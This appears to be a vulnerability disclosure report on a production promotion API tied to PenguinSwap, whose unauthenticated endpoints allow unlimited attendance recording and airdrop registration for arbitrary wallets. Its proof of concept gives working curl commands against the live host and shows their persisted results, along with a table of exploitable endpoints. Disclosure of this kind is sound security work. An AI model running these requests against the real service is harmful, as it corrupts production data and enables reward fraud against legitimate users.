# Promotion API: Unauthenticated Attendance Recording and Airdrop Registration Allow Unlimited Sybil Manipulation

## Summary

The Gluwa Promotion API (`gpromotion-api-prod.azurewebsites.net`), used by PenguinSwap to track user attendance and manage promotional campaigns, exposes write endpoints with **no authentication**. An attacker can record attendance for any wallet address an unlimited number of times, and register any wallet address for active airdrop campaigns, without proving ownership of the address.

---

## Severity

**HIGH**

---

## Affected Asset

- **URL**: `https://gpromotion-api-prod.azurewebsites.net`
- **Referenced by**: `https://penguinswap.org` (production DEX JS bundle includes this domain)
- **Swagger UI**: `https://gpromotion-api-prod.azurewebsites.net/swagger`

---

## Vulnerability Description

The Promotion API is a production ASP.NET service exposed publicly with a Swagger UI and 19 endpoints. The critical issue is that the write endpoints — which record user attendance and register wallets for promotional rewards — perform **no authentication or authorization checks**.

### Unauthenticated Attendance Recording

`POST /api/Attendance/{address}` accepts any ERC-20 address in the URL path and records an attendance event in the production database. No API key, session token, wallet signature, or any other credential is required.

**Live confirmed:**
- `POST /api/Attendance/0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef` → HTTP 200, record persisted with `clusterID: 4385`
- Immediate repeat → HTTP 200, second record persisted with `clusterID: 4386`
- No rate limiting. No duplicate-per-day protection at the API level.
- Attendance records confirmed via `GET /api/Attendance/Address/{address}` (also unauthenticated).

### Unauthenticated Airdrop Registration

`POST /api/WadeAirdrop` and `POST /api/OOZNFT` accept arbitrary wallet addresses, Twitter IDs, Discord handles, and Solana addresses with no authentication:

```json
{
  "stakedAddress": "0x<any address>",
  "twitterID": "any_twitter_id",
  "discordHandle": "anyuser#0000",
  "solAddress": "any_solana_address"
}
```

Response: HTTP 200. No ownership proof (e.g. signed message) is required.

### CORS Allows Cross-Origin Exploitation

All API responses include `Access-Control-Allow-Origin: *`, meaning these unauthenticated write endpoints can be triggered from any malicious website a user visits (no CSRF token needed for stateless APIs).

---

## Impact

1. **Attendance farming / Sybil rewards**: If PenguinSwap distributes rewards (tokens, NFTs, eligibility) based on attendance records in this API, an attacker can automate attendance recording for thousands of synthetic wallets. This directly undermines the fairness of any loyalty program or airdrop snapshot tied to attendance.

2. **Airdrop ballot stuffing**: An attacker can register an unlimited number of addresses for the WadeAirdrop and OOZ NFT campaigns, diluting legitimate user allocations.

3. **Inflation of clusterID metrics**: The sequential `clusterID` (currently in the 4380+ range as of 2026-06-03) suggests these records are actively consumed by a clustering/segmentation system. Fake records pollute the analytics and reward computation.

4. **No rate limit means automation is trivial**: A simple script can cycle through millions of generated addresses and submit attendance, poisoning the entire dataset at near-zero cost.

---

## Proof of Concept

### Step 1 — Record attendance for arbitrary address (no auth)

```bash
curl -X POST "https://gpromotion-api-prod.azurewebsites.net/api/Attendance/0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef" \
  -H "Content-Type: application/json"
# Response: HTTP 200 (empty body)
```

### Step 2 — Verify it was written to production database

```bash
curl "https://gpromotion-api-prod.azurewebsites.net/api/Attendance/Address/0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
```

**Live response (2026-06-03):**

```json
[
  {
    "createdDateTime": "2026-06-03T15:00:41.2275985",
    "address": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "id": "21b40d4b-85a5-4ee1-9a2a-358868942fff",
    "clusterID": 4386
  },
  {
    "createdDateTime": "2026-06-03T14:59:26.7291479",
    "address": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "id": "49de5d52-cc1c-4ba6-bdd8-988e5d984f99",
    "clusterID": 4385
  }
]
```

Two attendance records written to the production database for `0xdeadbeef...` within 2 minutes, with no authentication.

### Step 3 — Register any wallet for WadeAirdrop (no auth)

```bash
curl -X POST "https://gpromotion-api-prod.azurewebsites.net/api/WadeAirdrop" \
  -H "Content-Type: application/json" \
  -d '{"stakedAddress":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef","twitterID":"fake_user","discordHandle":"fake#0000","solAddress":"11111111111111111111111111111111"}'
# First run: HTTP 200 (registered in DB)
# Subsequent runs: HTTP 400 "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef already exists"
# The 400 on re-run confirms the first registration persisted successfully.
```

Identical behavior confirmed for `POST /api/OOZNFT`.

---

## Full Vulnerable Endpoint List

| Endpoint | Method | Auth | Confirmed Exploitable |
|----------|--------|------|-----------------------|
| `/api/Attendance/{address}` | POST | None | YES — writes to prod DB |
| `/api/Attendance/Address/{address}` | GET | None | YES — reads prod DB |
| `/api/WadeAirdrop` | POST | None | YES — HTTP 200 |
| `/api/OOZNFT` | POST | None | YES — HTTP 200 |
| `/api/CPC` | POST | None | YES (campaign expired) |
| `/api/Session` | POST | None | YES — creates sessions |
| `/api/Session/Address` | POST | None | YES |

---

## References

- PenguinSwap JS bundle at `https://penguinswap.org/assets/index-CTlUKMUf.js` — references `gpromotion-api-prod.azurewebsites.net` and `/api/Attendance/GetUTCTime`
- Swagger spec: `https://gpromotion-api-prod.azurewebsites.net/swagger/v1/swagger.json`
